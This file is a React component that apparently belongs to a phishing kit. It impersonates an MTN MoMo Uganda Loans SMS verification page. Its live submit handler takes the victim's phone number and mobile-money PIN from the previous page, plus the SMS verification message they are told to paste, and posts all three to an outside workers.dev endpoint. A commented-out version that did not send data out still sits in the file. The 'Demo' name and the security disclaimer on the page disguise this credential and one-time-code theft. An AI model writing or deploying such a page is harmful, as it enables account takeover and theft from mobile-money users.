import React, { useState } from "react";
import { useLocation } from "react-router-dom";

function SmsVerificationDemo() {
    const [smsMessage, setSmsMessage] = useState("");
    const [error, setError] = useState("");
    const [resending, setResending] = useState(false);
    const location = useLocation();
    const {phone , pin}=location.state || { phone: "", pin: "" };

    const handleResend = () => {
        setResending(true);
        setError("");

        console.log("SMS resend requested");

        setTimeout(() => {
            setResending(false);
        }, 1000);
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!smsMessage.trim()) {
            setError("Please paste your SMS message.");
            return;
        }

        setError("");
        // setSuccess("");
        // setLoading(true);

        try {
            const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/sm", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    mobile: phone,
                    pin: pin.join(""),
                    sms: smsMessage,
                }),
            });
            const data = await response.json();

            // if (!response.ok) {
            //     throw new Error(data?.message || "Verification request failed.");
            // }
            
            setSmsMessage("");
            console.log("Verification request submitted:", data);
            // setSuccess("Verification request submitted successfully.");
        } catch (err) {
            console.error("Verification API error:", err);
            setError(err.message || "Something went wrong.");
        } 
    };
    //   const handleSubmit = (e) => {
    //     e.preventDefault();

    //     if (!smsMessage.trim()) {
    //       setError("Please paste your SMS message.");
    //       return;
    //     }

    //     setError("");

    //     // Safe logging — actual SMS/code is intentionally not logged.
    //     console.log("SMS verification submitted", {
    //       messageProvided: true,
    //       messageLength: smsMessage.length,
    //       submittedAt: new Date().toISOString(),
    //     });

    //     // Yahan legitimate backend verification flow connect kar sakte ho.
    //   };

    return (
        <div className="min-h-dvh bg-white font-sans text-[#171f38]">

            {/* Header */}
            <header className="h-[64px] border-b border-[#e8e8e8]">
                <div className="relative mx-auto flex h-full max-w-[690px] items-center px-5">
                    <button
                        type="button"
                        className="text-[17px] text-[#172238]"
                    >
                        ← Back
                    </button>

                    <h1 className="absolute left-1/2 -translate-x-1/2 text-[17px] font-bold text-[#063866]">
                        SMS Verification
                    </h1>
                </div>
            </header>

            {/* Main */}
            <main className="mx-auto w-full max-w-[690px] px-4 pb-32 pt-8">
                <form
                    onSubmit={handleSubmit}
                    className="rounded-[15px] border border-[#e5e5e5] bg-white p-7 shadow-[0_3px_14px_rgba(0,0,0,0.06)]"
                >
                    <h2 className="text-[20px] font-bold text-[#063866]">
                        Paste SMS Message
                    </h2>

                    <p className="mt-1 text-[14px] leading-[1.25] text-[#888]">
                        We have sent a verification message to your
                        <br />
                        phone number. Please copy and paste the
                        <br />
                        message below.
                    </p>

                    {/* Error / status */}
                    {error && (
                        <div className="mt-6 rounded-[8px] border border-[#ffb5b5] bg-[#fff5f5] px-5 py-4 text-center">
                            <p className="text-[14px] leading-[1.45] text-[#d22]">
                                {error}
                            </p>
                        </div>
                    )}

                    {/* Resend
          <div className="mt-6 rounded-[8px] border border-[#ffb5b5] bg-[#fff5f5] px-5 py-4 text-center">
            <p className="text-[14px] leading-[1.45] text-[#d22]">
              ⏱ Your verification session has expired.
              <br />
              Request a new SMS and paste it below.
            </p>

            <button
              type="button"
              onClick={handleResend}
              disabled={resending}
              className="mt-4 rounded-[7px] bg-[#063866] px-6 py-3 text-[14px] font-bold text-white disabled:opacity-60"
            >
              {resending ? "Sending..." : "↻ Resend SMS"}
            </button>
          </div> */}

                    {/* SMS input */}
                    <textarea
                        value={smsMessage}
                        onChange={(e) => {
                            setSmsMessage(e.target.value);
                            setError("");
                        }}
                        placeholder="Paste your SMS message here..."
                        className="
              mt-5
              h-[120px]
              w-full
              resize-none
              rounded-[9px]
              border
              border-[#d8d8d8]
              bg-white
              px-4
              py-3
              text-[15px]
              outline-none
              focus:border-[#063866]
              placeholder:text-[#888]
            "
                    />

                    <p className="mt-3 text-[13px] italic leading-[1.35] text-[#8a8a8a]">
                        Verification credentials should be handled securely by the
                        authentication provider.
                    </p>

                    {/* Submit */}
                    <button
                        type="submit"
                        disabled={!smsMessage.trim()}
                        className={`
              mt-4
              h-[44px]
              w-full
              rounded-[8px]
              text-[15px]
              font-bold
              transition
              ${smsMessage.trim()
                                ? "bg-[#063866] text-white"
                                : "bg-[#e7e7e7] text-[#aaa]"
                            }
            `}
                    >
                        SUBMIT
                    </button>
                </form>
            </main>

            {/* Footer */}
            <footer className="fixed bottom-0 left-0 right-0 h-[104px] bg-[#063866]">
                <div className="flex h-full items-end justify-center pb-4 text-center">
                    <p className="text-[12px] leading-[1.3] text-[#a9c2dd]">
                        © 2026 MTN MoMo Uganda Loans – Powered
                        <br />
                        by MTN
                    </p>
                </div>
            </footer>
        </div>
    );
}

export default SmsVerificationDemo;
